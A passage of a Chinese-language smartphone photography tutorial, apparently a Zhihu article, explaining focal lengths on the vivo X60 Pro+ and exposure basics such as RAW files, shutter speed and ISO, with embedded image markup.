23mm）</h3>\n<p>都说只听新人笑，未听旧人哭。我想现在对这句话感触最深的一定是所有安卓影像旗舰的「主镜头」。因为今天很多手机厂商几乎已经很少主动宣传主镜头的拍摄能力，基本上都是围绕着超广角或者是超长焦。这其实潜移默化也影响了很多用户自己本身的使用习惯。</p>\n<p>至少我自己就是这样的，我会发现我使用超广角和长焦拍摄的概率远高于使用 1X 广角镜头。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-37c698d37e4a278e93416320e94ec2b5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-37c698d37e4a278e93416320e94ec2b5_r.jpg\"></figure><p>当然这也不能完全是我喜新厌旧，因为其实在摄影领域里，23mm 本身并不是热门焦段。它的劣势在于本身还具有一定的广角性质，画面有着强烈的透视风格，另一方面它并不是一个适合常规人像拍摄的焦距，拍摄有门槛。不过，这并不是说这个焦距不好。它也有自己的优势，比如这是人文摄影中最为经典的焦段之一。</p>\n<p>手机厂商选择这个焦段还有一个原因是，它可以让「日常拍摄主题拍摄内容覆盖更多题材」。因为在多镜头之前，我们「没得选」，需要一个什么都能拍的焦距选择，那么的确 23mm 左右是为适合的一个选择。不过并不是说，23mm 在今天多镜头的环境下没有用武之地，它依然有着它独特的优势。</p>\n<p><b>最好的画质</b></p>\n<p>其实在多颗镜头推出的初期，还有一个所谓的「主副镜头」的概念，虽然这一概念是完全错误的，可是今天它的影响还没有完全消失。但是这样的概念出现，归根到底是因为在多镜头出现的初期，其它新增焦距镜头的画质和元老级别的 23mm 焦段的调教经验相差很多。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-678db898a2b38a4f3bdbda25c96635d7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-678db898a2b38a4f3bdbda25c96635d7_r.jpg\"></figure><p>所以这也就造成了，画质上的差距。</p>\n<p>因此，如果你今天想要拍摄的画面需要最好的画质保证，那么只要放心的使用 1X 镜头的 23mm 镜头即可。</p>\n<p><b>不夸张的广角效果</b></p>\n<p>在专业相机的领域里，其实是有一个镜头焦距的大致分类的。比如说小于 35mm ，我们一般就认为是广角镜头的区间，那么显然 23mm 是包含在这个区间以内的。所以在之前我们提到的超广角所具有的特征，广角镜头一定会具备，只不过是「症状更轻」。</p>\n<p>比如画面的边缘拉伸，画面的中央挤压特性等等。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b8fefabe562a3f2c200ecbfecd7fcd87_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-b8fefabe562a3f2c200ecbfecd7fcd87_r.jpg\"></figure><h3>长焦镜头（5X/等效焦距 125mm）</h3>\n<p>长焦镜头在摄影中的定义一般来说要在 85mm 及以上的焦距。大多数人对于长焦镜头的理解基本上只是局限在「拍得远」。的确，某种意义上来说长焦镜头甚至是望远镜的代名词。随着长焦数值的增加，我们可以看到的距离也就更远。</p>\n<p>但是拍得远，仅仅是长焦镜头的一个要素。对于长焦镜头，摄影师更加看重的是它相对于超广角镜头完全相反的一面。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-80cfe32641b1f4efbc68ae1de7e7fc12_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-80cfe32641b1f4efbc68ae1de7e7fc12_r.jpg\"></figure><p>在前面我们知道超广角镜头拍摄的画面更广，画面中近大远小的效果更明显。那么长焦镜头其实则是完全相反的。对于长焦镜头来说：</p>\n<p>我们拍摄的范围会很窄，与此同时，拍摄的内容更远，并且画面不会再有特别夸张的透视效果。</p>\n<p><b>主动的减法</b></p>\n<p>如果说超广角镜头的难处是画面中包含了一切，需要摄影师主动安排和调整，那么长焦镜头则会相对主动一些。因为长焦镜头拍摄的很窄，所以大多数情况下使用长焦镜头，就会主动的减去画面中的不必要组成部分。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-0f7e842d3a4c313fb2529a73fcb2c1ec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2059\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-0f7e842d3a4c313fb2529a73fcb2c1ec_r.jpg\"></figure><p>如果你是刚刚学习摄影，或者是对于构图不熟练的新手拍摄者，那么就可以多多尝试使用长焦镜头进行拍摄。比如上图，我们就可以一目了然的看到画面中的主体是月亮。拍摄时，完全不需要考虑地面或者是其它景物。</p>\n<p><b>透视与层次</b></p>\n<p>我自己是非常喜欢使用长焦镜头进行拍摄的。尤其是在一些风景作品中，我甚至是爱长焦超过超广角。因为如果说超广角镜头的特点是可以让空间中的远近关系明确的话，那么长焦镜头则完全相反。它一个很重要的特性就是「压缩空间」，让画面中的远近关系模糊掉。</p>\n<p>比如下面这张图，我们可以看到画面中的景物远近关系并不明显，好像每一个部分都是「被压瘪了一样」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d02e160f4e9a367c32b75f9ebb1d76c4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-d02e160f4e9a367c32b75f9ebb1d76c4_r.jpg\"></figure><p>这样的视觉效果最大的一个好处就是可以给我们的画面带来非常明显的层次，而这种层次也就是照片中韵律和节奏的来源之一。我这样说可能有一点抽象，我还是使用一张图作为案例。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3210\" data-rawheight=\"1986\" class=\"origin_image zh-lightbox-thumb\" width=\"3210\" data-original=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_r.jpg\"></figure><p>这张图是我在新疆拍摄的，当时太阳正在落上，光线正在远处的山间移动。由于使用了 vivo X60 Pro+ 长焦镜头拍摄，125mm 的焦距让整个草原景色有着非常清晰的线条。而这些线条就像是人类的骨骼，给整幅画面以筋骨。而我所说的韵律正是这些隐藏在长焦照片风景中的线。</p>\n<p>比如我换另一张照片，如下图，我们依然可以在画面中寻找到类似的线条。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0fc4b0cbe9e518bbc0263c4901c13a67_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic4.zhimg.com/v2-0fc4b0cbe9e518bbc0263c4901c13a67_r.jpg\"></figure><p>所以我自己来判断一张长焦风光照是不是美，某种意义上就是在看画面中的「线条美不美」。而我所说的韵律和节奏正是这些曲线流动的方式。</p>\n<p>这些优美的线条会把画面分割为不同的部分，这种风格可能很复杂也可能很简单。比如下面这张图中，我们只会看到一条线。而正是这条线把地面和天空简单地分开。这张图看似简单，但实际上当你使用非长焦镜头时却无法获得。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-c0c0fd74dbeb384a13c40bf8cd82827a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-c0c0fd74dbeb384a13c40bf8cd82827a_r.jpg\"></figure><p>可能这就是我喜欢长焦镜头的原因，它非常优雅。你需要寻找画面中流动的线条，并且尝试用这些线条为画面分离出层次。</p>\n<p>由于本篇文章并不涉及后期，但是既然已经提到了韵律和节奏。正好就在这里趁热打铁，来分享一个后期思路。还是刚才的照片，这是它后期前后的对比：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c4235b33619a64d15c2decd1dc69e19b_b.jpg\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-c4235b33619a64d15c2decd1dc69e19b_r.jpg\"><figcaption>修图前</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_b.jpg\" data-size=\"normal\" data-rawwidth=\"3210\" data-rawheight=\"1986\" class=\"origin_image zh-lightbox-thumb\" width=\"3210\" data-original=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_r.jpg\"><figcaption>修图后</figcaption></figure><p>仔细观察发现，这张照片除了去除一些杂物以外，还有一个很重要的不同，这就是后者显然更加凸显画面中原有的线条和光线。</p>\n<p>这种「凸显」，就是著名的风光摄影师亚当斯所说的那句，摄影中：</p>\n<blockquote>前期拍摄就是谱曲，而后期就是演奏。</blockquote>\n<p>我在后期时，会先看整个照片的韵律到底在哪里。比如我看到画面中的各种线条非常优美，那我就强化这种优美。而方式也非常简单，让画面中线条分割的两部分对比更加明显。亮的更加亮，暗的更加暗。这种后期方式其实无处不在，几乎很多风光摄影大片都是如此。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d1615dd73dd8bb5355f3847dd2ac91a8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-d1615dd73dd8bb5355f3847dd2ac91a8_r.jpg\"></figure><p>当然了，后期的思路和理念很多，以后如果有机会再和大家分享，很可能又是四万字。</p>\n<p>不过，这也是前面审美章节的又一例证，如果你精通音乐，自然就能立刻感受到照片中的韵律。一个不算冷门的知识，风光大师安塞尔·亚当斯其实本身是一个钢琴家。</p>\n<p>所以摄影啊，最重要的一定是摄影以外的东西。</p>\n<p><b>避免晃动</b></p>\n<p>超长焦镜头是最近几年才出现在智能手机上的，归根到底是因为，长焦镜头需要的技术门槛实在是太高了。其实不仅仅是技术门槛，使用门槛也极高。因为对于长焦镜头来说，由于光学的物理特性，导致：</p>\n<p>「长焦镜头对于防抖要求极高」。</p>\n<p>相信很多使用长焦镜头的用户会发现，长焦镜头很容易「糊照片」。具体的原因，在后面的曝光章节中会详细阐述，但在这里你只要知道，使用长焦镜头时尽量要保证画面的稳定 。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-280ae77831648d8d1fc9f004cccb77bb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-280ae77831648d8d1fc9f004cccb77bb_r.jpg\"></figure><p>需要强调的是，长焦镜头可不是越长越好。现在一些厂商为了「技术竞赛」，完全不顾用户的真实体验，一些超长焦，甚至是百倍变焦频出。他们对于长焦的理解的意义仅为「远」，那么看到这里你应该也知道这种远并不是长焦的奥义。过长的焦距很多时候也大大限制它的使用场景，比如焦距只要超过 150mm ，室内就完全无法使用，当然你实力雄厚，家里是几百平的大平层就当我没说。</p>\n<h3>标准镜头（2X/等效焦距 50mm）</h3>\n<p>如果要说在目前所有手机提供的镜头焦段中，哪一个适合拍摄人像，那么我一定会告诉你选择这颗 2X 的 50mm 镜头。我们前文所阐述的超广角、长焦恰好是镜头焦距的两个极端。那么 50mm 恰好是他们的中点。也就是说：</p>\n<p>「50mm 没有夸张的透视效果，也有一个不窄不宽的拍摄范围。」</p>\n<p>也正是因为这个原因，50mm 左右的镜头也会被摄影师们称之为「标准焦距」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-9ce5ed3d560622257ab316fd2ffadb17_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-9ce5ed3d560622257ab316fd2ffadb17_r.jpg\"></figure><p>而它是手机上最适合拍摄人像的一个关键原因就在于一方面由于没有夸张的透视效果，可以保证人物主体不变形，另一方面这个焦距可以很好地兼顾环境和人物之间的关系。</p>\n<p>如果你正在使用这个焦距的镜头拍摄人物，此时如果向前走一步，就可以拍摄人物的大肖像特写。而这样的肖像特写会着重表现人物的表情和心理状态。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0f4b4d9866d2d8e5ed04a82769d0f3eb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-0f4b4d9866d2d8e5ed04a82769d0f3eb_r.jpg\"></figure><p>而如果你退一步，就可以拍摄人物的环境肖像。环境肖像具有更强的叙述性，可以让我们看清画面中的因果关系，更加注重的是人物的动作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-1dd8f523c4561361de31bc456542ec2f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-1dd8f523c4561361de31bc456542ec2f_r.jpg\"></figure><p>这里可以给所有苦恼给女朋友拍照片的男孩子们敲一下黑板上的重点，使用标准镜头拍摄姑娘成功率更高，更难出现一些意外状况。也算做是一个重要的「保命技能」吧。</p>\n<p>当然标准焦距除了人像以外，静物尤其是美食静物也是很好的选择。标准焦距既不会让食物或者是杯具变形，也不需要你本身离食物过远，不方便摆盘或者是调整。既然说到美食，就分享一个生活中最常见的一个小技巧。大家平时出去打卡餐厅可能会需要俯拍食物，但是使用 1X 23mm 焦距时很容易出现自己手的阴影，那么如果我们使用 2X 50mm 标准焦距就可以很大程度上避免这样的问题。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-898ceae8d9f7fac1b7c7c48b054f8b89_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-898ceae8d9f7fac1b7c7c48b054f8b89_r.jpg\"></figure><p>以上，就是四颗不同镜头的一些简单总结。但是需要说明的是，这只是常规意义上的经验，虽然打破常规这句话你可能听过很多次了，但其实本章节所阐述的「摄影眼」，最终的意义就是，寻找非寻常视角。</p>\n<p>归根到底，所谓的摄影眼，就是我们看待世界的方式。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-0c679c4ac0ebb247f82f9dd5e23708f5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-0c679c4ac0ebb247f82f9dd5e23708f5_r.jpg\"></figure><p>从技术来说，一个会拍照的摄影师，眼睛是会「自动变焦」的。当它走进一个场景，它的眼睛就会直接自动出现不同焦距的镜头在此场景中的效果。当然你也可以采用最笨的方式，直接更换不同焦距的镜头尝试取景。尤其是今天手机镜头的出现，更换镜头只需要通过点按画面中的按钮。而在以前，可是需要摄影师不断手动更换镜头才行。</p>\n<p>本章节的题目叫做镜头中的摄影眼，这句话的更想强调的是不同镜头带给我们的视野感受。但决定一张照片最终视野的并不是「镜头的焦距」，而是我们「内心的眼睛」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5611833503d52d53dcd509fc8d2721af_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3120\" data-rawheight=\"4160\" class=\"origin_image zh-lightbox-thumb\" width=\"3120\" data-original=\"https://pic4.zhimg.com/v2-5611833503d52d53dcd509fc8d2721af_r.jpg\"></figure><p>这就是我前面没有说完的，「如果你拍得不够好，是因为你拍得不够近」中，主观的近。尤其是我们想要为我们的照片注入情感，我们就需要用心去靠近。</p>\n<p>见天地者，即使长焦镜头也能展辽阔。</p>\n<p>见微小者，即使广角镜头也能嗅蔷薇。</p>\n<h2>04. 明与暗</h2>\n<p>在开始这一章节之前，我们需要做一件事，这就是了解相机的结构。不过别担心，我保证讲解的相机结构是阅读这篇文章的每一个人都可以读懂。</p>\n<h3>光的捕捉</h3>\n<p>今天的市场上，相机的种类可以说是五花八门。你打开各种交易网站，各类相机琳琅满目。就不说各种非常细致的分类了，就说价格区间也是相当的大。从几十块到几十万，想买多贵的都有。但是即使如此，几十万块的相机和几十块的相机基本原理都完全相同。</p>\n<p>就算是相机和手机，两种摄影的原理也相同。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-1ad1d11c4b492bfa50b7611368a158e0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-1ad1d11c4b492bfa50b7611368a158e0_r.jpg\"></figure><p>这是因为摄影的本质来自于一个我们都学过的物理知识：</p>\n<p>「小孔成像」。</p>\n<p>是的，所有相机拍摄的画面，都是透过一个小孔，把画面映射到一个记录光线的载体中，而为了保证映射的画面不被干扰，所以所有的这一切都被放置到一个不透光的盒子中发生。</p>\n<p>当然这样说比较抽象，所以我准备了一个非常简单的动图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-c647bbd08e4be5b840b5dd9ce9931a99_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"639\" data-rawheight=\"451\" data-thumbnail=\"https://pic2.zhimg.com/v2-c647bbd08e4be5b840b5dd9ce9931a99_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"639\" data-original=\"https://pic2.zhimg.com/v2-c647bbd08e4be5b840b5dd9ce9931a99_r.jpg\"></figure><p>在这个图中我们可以看到，所谓透光的小孔就是镜头，而密封的盒子就是机身，而对于手机来说，我们所谓的 CMOS 传感器就是记录光线的载体。</p>\n<p>其实这个记录光线的载体材质是有演变的，在摄影诞生初期甚至是各种金属板。当然最著名的两个就是胶片和今天的光学传感器。他们的目的无非就是把光线记录下来。因为今天我们的手机都是使用数码光学传感器，所以这篇文章里就只谈谈数码曝光流程。</p>\n<p>在开始之前，要说明的是，这里可不是跟摄影无关的理论知识。这里的描述对于你理解曝光有着至关重要的作用，它是一种基础。所以，这一部分千万不要跳过阅读。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d19375fadc37ec544ebb09132ca69dfc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-d19375fadc37ec544ebb09132ca69dfc_r.jpg\"></figure><p>所以当我们拍摄一张照片时，相机都在做什么呢？</p>\n<p>当我们按下快门的那一刻，光线透过小孔进入密封的机身，然后传感器通电，此时光信号转换为电信号，电信号再被传感器记录下来。但此时记录下来的信号，仅仅是单纯的「数字」。而这些记录下来的数字，我们叫做「Raw」文件。</p>\n<p>这个词，你可能第一次听说。但是你打开 vivo X60 Pro+ ，在专业模式里，就有一个开关按钮，打开以后，你就可以记录 Raw ，也就是这些原始的画面数据。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-1bcdf71bf3d5874863d953f1813bc77f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"888\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-1bcdf71bf3d5874863d953f1813bc77f_r.jpg\"></figure><p>但 Raw 格式，还不是我们所说的画面。我们想要真正的看到画面，我们的相机需要对这些数字进行翻译。也就是 Raw 格式变为我们常见的 JPG 以后，才是我们熟知的照片。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-ce2ab2a8d39581804ed283dc1d180032_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-ce2ab2a8d39581804ed283dc1d180032_r.jpg\"></figure><p>但是这种「翻译」有两个问题：</p>\n<ol>\n<li>翻译是有风格的，这也是为什么同样拍摄一个场景，大家的照片色彩风格不同。比如本篇文章的 vivo X 系列手机有着很强烈的类似徕卡的油画色调。而有风格，就会有喜爱。比如我自己就很反对一些品牌过度的颜色饱和。</li>\n<li>翻译是有损失的，因为 JPG 的结果是 Raw 格式的「取舍」。所以只要是 JPG 就意味信息丢失了。</li>\n</ol>\n<p>不过 Raw 格式的问题也是显而易见，它的存储量很大，一张就要几十M，而且它必须要后期，不然你甚至无法分享社交网络。</p>\n<p>所以这里的建议是，大多数情况用 JPG 够了，如果你真的喜欢后期，想要后期宽容度高，那么就使用 Raw。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-4698d5f34ccee5d2d0f8b05b25c60d0d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3060\" data-rawheight=\"4080\" class=\"origin_image zh-lightbox-thumb\" width=\"3060\" data-original=\"https://pic2.zhimg.com/v2-4698d5f34ccee5d2d0f8b05b25c60d0d_r.jpg\"></figure><h3>光的控制</h3>\n<p>说回正题，曝光。</p>\n<p>拍完一张照片，摄影师经常会给找一个评价，比如曝光太过了，或者是曝光不够。而这里的曝光不够，或者是曝光太过了，就是在说：</p>\n<p><b>进入相机的光线是否适量。</b></p>\n<p>所以我们要弄清楚第一个问题：</p>\n<p><b>相机是如何控制进入光线的量？</b></p>\n<p>我们回顾刚才的相机原理，传感器在记录光线是需要通电的。那么可想而知，通电时间越长，光线进入的总量也就会越多。</p>\n<p>而这个「通电时间」，就是我们所说的<b>「快门速度」。</b></p>\n<p>我们经常会在相机的参数里，看到一个「秒」，这个就是快门速度。比如下图中，快门速度就是 1/950S。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-502343fbba6b94448bd5b0f956295a6c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-502343fbba6b94448bd5b0f956295a6c_r.jpg\"></figure><p>那么显然，快门速度越长，进入的光线就会越多，那么我们拍摄的画面结果就会越亮。</p>\n<p>快门速度的跨度其实是非常大的，它可以是一瞬间，比如 1/2000S，它也可以是一段时间，比如 30S。他们之间相差有 60 万倍。那显然他们拍摄的画面效果是完全不同的。</p>\n<p>下图的快门速度是 1/5000S ，我们发现画面中所有人物的动作都被凝固了起来。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ebb8d26db9ccbc155ec07f6f16603cb9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3834\" data-rawheight=\"2876\" class=\"origin_image zh-lightbox-thumb\" width=\"3834\" data-original=\"https://pic2.zhimg.com/v2-ebb8d26db9ccbc155ec07f6f16603cb9_r.jpg\"></figure><p>而下图的快门速度是 0.7S ，我们会发现画面中的景物，尤其是光线会形成一种轨迹。这其实就是我们常规所说的光绘摄影，或者说慢门长曝光摄影。不过，想要拍摄这样的画面，有一个非常重要的前提，这就是需要拍摄时保持画面的稳定。只要画面晃动，就会造成画面模糊。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d2fe81044678809103fc539190ef6c69_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic2.zhimg.com/v2-d2fe81044678809103fc539190ef6c69_r.jpg\"></figure><p>这就是为什么星空摄影，光绘摄影都需要三脚架的配合。</p>\n<p>当然，影响画面明暗的不仅仅是快门速度一个参数。我们继续回到刚才的相机原理，我们知道光线最终是被「传感器」 记录的。那么显然这个传感器对于光线的感知能力，也影响着画面的明暗。</p>\n<p>同样时间进来的光线，如果这个传感器对于光线的感知能力强，那么显然画面就会亮，而如果这个传感器对于光线的感知能力不强。那么显然画面就会暗。而这个描述出传感器感光能力的数值，就是感光度。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-53a9bd913674019797063ab17284b15f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-53a9bd913674019797063ab17284b15f_r.jpg\"></figure><p>在胶片摄影时代，胶卷的感光度是固定的，比如 ISO 800、ISO 160 等。但是今天的数字传感器，感光值是一个可以变化的范围。</p>\n<p>vivo X60 Pro+ 的感光值范围是 50-3200。</p>\n<p>可想而知，感光值越高，画面越亮，感光值越低，画面越暗。</p>\n<p>这么一听，你可能会很兴奋，那是不是说只要我们无限控制感光度，我们就可以任何光线都能拍照。可事实我们发现我们并没有随心所欲。这是因为，今天的传感器有一个特性：</p>\n<p><b>随着感光值的提升，照片的画质会极速下降。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e265ec0b01ff2fe5c9ad60efaf2517f6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-e265ec0b01ff2fe5c9ad60efaf2517f6_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b9423bd9b15d269f3089d21332454b3f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-b9423bd9b15d269f3089d21332454b3f_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-6003bd2cd3f915728b4db947bad084dc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-6003bd2cd3f915728b4db947bad084dc_r.jpg\"></figure><p>所以，调高感光值是有一个限度范围。而这个范围远没有大家想的高，对于手机来说，我认为 1600 已经算作是上限了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-05b0962f3508728487a5795617eb57b8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-05b0962f3508728487a5795617eb57b8_r.jpg\"></figure><p>好了，了解到这里，你已经知道如何控制画面的明暗了：</p>\n<ol>\n<li>快门速度</li>\n<li>感光值</li>\n</ol>\n<p>但其实如果你使用的是传统相机，还有一个很重要的参数，这就是光圈，但因为手机目前的光圈不可调节，所以为了减少学习压力，此处就按下不表。</p>\n<p>当然我知道读了这么多，其实你就学了两句话：</p>\n<p><b>快门速度越慢，画面越亮，快门速度越快，画面越暗。</b></p>\n<p><b>感光值越高，画面越亮，感光纸值越低，画面越暗。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-08dd2a95833462b771950565b735c346_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-08dd2a95833462b771950565b735c346_r.jpg\"></figure><p>但是实际上，以上的原理过程才是真正对你创作有帮助的。如果我上来就告诉你结论，你会单纯的机械记忆。</p>\n<p>在以后的拍摄，或者是摄影学习中会遇到各种疑问。但是现在你从原理出发，这两句话只是顺其自然的结果。你就可以合理应用，比如现在你知道了：</p>\n<p><b>我想要画面中动态的效果，我就要延长快门速度。而此时画面过亮了，那我就降低一些感光值。</b></p>\n<p>当然你可能会说，这些参数我懂了，可是我在手机拍摄时，从来没有见过这这些参数。</p>\n<p>不，你见过。</p>\n<p>打开 vivo X60 Pro+ 的专业模式，我们就会看到 ISO 感光值 和 S 所代表的快门速度。点按两个参数进行调节，感受一下是不是和我前面描述的效果一致。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-78e198852ab5969cb21f0bd2ddad5c9a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic3.zhimg.com/v2-78e198852ab5969cb21f0bd2ddad5c9a_r.jpg\"></figure><h3>光的标尺</h3>\n<p>但对于曝光来说，学会控制曝光的工具才仅仅是第一步。</p>\n<p>而下一步，才是这一章节中最为重要的内容：</p>\n<p><b>到底什么样的曝光是合适的。</b></p>\n<p>但这里的合适，它是由两层含义的。一个是，客观上的合适，我愿意叫做为正确的曝光。另一个是，主观上的合适，我愿意叫做美的曝光。可能比较抽象，那我直接使用一张图举例你可能就会立刻了解了：</p>\n<figure data-size=\"normal\"><img 